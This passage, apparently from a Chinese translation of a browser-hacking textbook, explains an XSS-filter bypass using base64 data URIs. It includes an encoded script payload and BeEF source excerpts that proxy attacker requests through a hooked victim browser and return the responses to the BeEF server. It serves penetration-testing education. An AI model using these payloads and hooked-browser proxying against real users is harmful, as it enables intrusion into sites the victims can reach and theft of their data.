
Chrome的过滤器，也在Safari中实现（因为它们都使用WebKit渲染引擎），被称为`XssAuditor`。此过滤器无法防止使用data URI向量进行的XSS攻击。Mario Heiderich在2010年向Chrome开发团队报告了此问题。24 此时的此绕过尚未被修复。

data URI方案最初是用于在HTML页面中以外部资源的形式包含内联数据。其格式为：

```
data:[<MIME-type>][;charset=<encoding>][;base64],<data>
```

当你对原始PNG图像进行base64编码时，会得到以下data URI：

```
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA \
AAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO \
9TXL0Y4OHwAAAABJRU5ErkJggg==">
```

这种方案并不阻止包含其他类型的内容，例如使用charset为text/html的类型并base64编码字符串如<script>alert(1)</script>。如果你编码该字符串，会得到以下data URI：

```
<iframe src="data:text/html;base64, \
PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
```

这正是BeEF的XssRays功能在Chrome和Safari浏览器中使用的相同技术。下面的JavaScript代码片段展示了其逻辑：

```
if(beef.browser.isC() || beef.browser.isS()){
  // 如果浏览器是Chrome或Safari
  var datauri = btoa(url);
  iframe.src = "data:text/html;base64," + datauri;
}else{
  iframe.src = url;
}
```

现在你已经了解了可以利用XSS漏洞发起的攻击，让我们进一步提升。在下一节中，你将探索不同的方法来实现你的目标。

# 通过浏览器代理

一个宽松的跨源策略，使用通配符或SOP绕过，允许你使用被钩住的浏览器作为开放的HTTP代理。如果没有SOP绕过或配置错误，你仍然可以通过被钩住的浏览器代理请求，但SOP将你限制在当前被钩住的源域。这在以下情况下很有用：通过XSS钩住一个源域，但你没有直接访问它。SOP绕过在第四章中涵盖。

BeEF的Tunneling Proxy扩展在127.0.0.1:6789绑定一个服务器套接字，能够解析原始HTTP请求。以下代码片段展示了其部分功能：

```
def initialize
  @conf = BeEF::Core::Configuration.instance
  @proxy_server = TCPServer.new(
   @conf.get('beef.extension.proxy.address'), 
   @conf.get('beef.extension.proxy.port')
  )

  loop do
    proxy = @proxy_server.accept
    Thread.new proxy, &method(:handle_request)
  end
end

def handle_request socket
  request_line = socket.readline

  # HTTP method # defaults to GET
  method = request_line[/^\w+/]

  # HTTP version # defaults to 1.0
  version = request_line[/HTTP\/(1\.\d)\s*$/, 1]
  version = "1.0" if version.nil?

  # url # host:port/path
  url = request_line[/^\w+\s+(\S+)/, 1]

  # We're overwriting the URI::Parser UNRESERVED 
  # regex to prevent BAD URI errors when sending 
  # attack vectors (see tolerant_parser)
  tolerant_parser = URI::Parser.new(
   :UNRESERVED => BeEF::Core::Configuration.instance.get(
     "beef.extension.requester.uri_unreserved_chars")
  )
  uri = tolerant_parser.parse(url.to_s)

  raw_request = request_line
  content_length = 0

  loop do
    line = socket.readline

    if line =~ /^Content-Length:\s+(\d+)\s*$/
      content_length = $1.to_i
    end

    if line.strip.empty?
      # read data still in the socket
      # exactly <content_length> bytes
      if content_length >= 0
        raw_request += "\r\n" + socket.read(content_length)
      end
      break
    else
      raw_request += line
    end
  end
  [...snip...]
end
```

原始HTTP请求到达服务器套接字后会被解析并存储在BeEF的数据库中。另一个组件会从数据库中检索原始请求数据，并将其转换为 XMLHttpRequest。这些转换后的请求已准备好通过XHR-polling、WebSocket或DNS等通信通道注入到被钩住的浏览器DOM中。如第三章所述，这些通道包括XHR-polling、WebSocket或DNS。

Requester服务器端组件会在被钩住的浏览器中注入正确的BeEF JavaScript API调用：

```
def add_to_body(output)
  @body << %Q{
    beef.execute(function() {
      beef.net.requester.send(
        #{output.to_json}
       );
    });
  }
end
```

变量output，在代码片段中可见，是一个Hash的JSON表示，包含发送所需的所有请求详细信息。这些信息作为参数传递给beef.net.requester.send方法。该方法为requests_array数组的每个条目创建一个XMLHttpRequest，并调用beef.net.forge_request，如下所示：

```
beef.net.requester = {

 handler: "requester",

 send: function(requests_array) {  
  for (i in requests_array) {  
   request = requests_array[i];  
   
   # use BeEF's forge_request API to create
   # an XHR object with all the required info
   beef.net.forge_request('http', request.method, request.host, 
    request.port, request.uri, null, request.headers, request.data, 
    10, null, request.allowCrossDomain, request.id, function(res, 
    requestid){

      # the callback to be executed, which sends back
      # to the server the XHR response data 
      beef.net.send('/requester', requestid, {
       response_data: res.response_body,
       response_status_code: res.status_code,
       response_status_text: res.status_text,
       response_port_status: res.port_status,
       response_headers: res.headers});
   });
  }
 }
};
```

forge_request的最后一个参数是一个匿名函数，用作回调，在forge_request完成时被调用。这会触发beef.net.send，以将XHR响应数据（如状态、头部和体）发送回BeEF服务器。服务器会剥除部分HTTP响应头，主要是与缓存和编码相关的字段，并调整Content-Length响应头。这种响应规范化是必要的，因为原始HTTP响应是通过XMLHttpRequest获取的，可能包含GZIP编码头部。如果Tunneling Proxy服务器保留这些头部，可能会导致Content-Length不匹配问题，因为被钩住的浏览器在获得XHR响应后已经解码了响应。

在此阶段，规范化后的原始HTTP响应可以发送回最初向BeEF的Tunneling Proxy端口6789发送请求的套接字。根据BeEF中配置的轮询超时、目标应用的响应时间以及被钩住浏览器的带宽，你可能会在收到响应时注意到几秒的延迟。

为了减少这些延迟，BeEF的WebSocket通信通道可以帮助。默认情况下该通道是禁用的，需要先启用。WebSocket是一个流式协议，比默认的XHR-polling通道快得多。WebSocket通道仅在被钩住的浏览器完全支持时启用，因此无需担心失去对较旧浏览器的钩连可能。

## 通过浏览器浏览

最常见的代理配置是使用标准HTTP代理作为浏览Internet时的中介。让我们稍微调整这个模型。

与其使用标准HTTP代理，你可以插入被钩住的浏览器。现在中介是被钩住的浏览器，而不仅仅是代理，它不仅代理你的请求，还为所有请求提供代理的权限。结果是，被钩住的浏览器允许你浏览被钩住的源域，这可能之前超出了你的可达范围。
